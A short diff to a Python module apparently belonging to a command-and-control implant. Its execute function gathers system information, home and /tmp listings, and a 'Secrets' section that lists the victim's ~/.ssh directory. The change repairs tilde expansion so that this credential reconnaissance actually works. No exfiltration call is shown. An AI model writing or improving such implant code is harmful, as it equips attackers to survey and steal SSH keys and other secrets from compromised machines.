@@ -1,6 +1,7 @@
 import subprocess
 import json
 import time
+import os
 
 
 def run_cmd(cmd):
@@ -55,6 +56,8 @@ def execute(params, task_id, callback_id):
 
     mode = params.strip().lower() if params else "quick"
 
+    home_dir = os.path.expanduser("~")
+
     data = {}
 
     # System info
@@ -93,13 +96,17 @@ def execute(params, task_id, callback_id):
 
     # Files
     data["files"] = {
-        "home": run_cmd(["ls", "-la", "~"]),
+        "home": run_cmd(["ls", "-la", home_dir]),
         "tmp": run_cmd(["ls", "-la", "/tmp"]),
     }
+    
+    ssh_dir = os.path.join(home_dir, ".ssh")
+    if not os.path.exists(ssh_dir):
+        ssh_dir = None
 
     # Secrets (light touch)
     data["secrets"] = {
-        "ssh_keys": run_cmd(["ls", "-la", "~/.ssh"]),
+    "ssh_keys": run_cmd(["ls", "-la", ssh_dir]) if ssh_dir else {"success": False, "error": "no .ssh directory"}
     }
 
     # Proc data
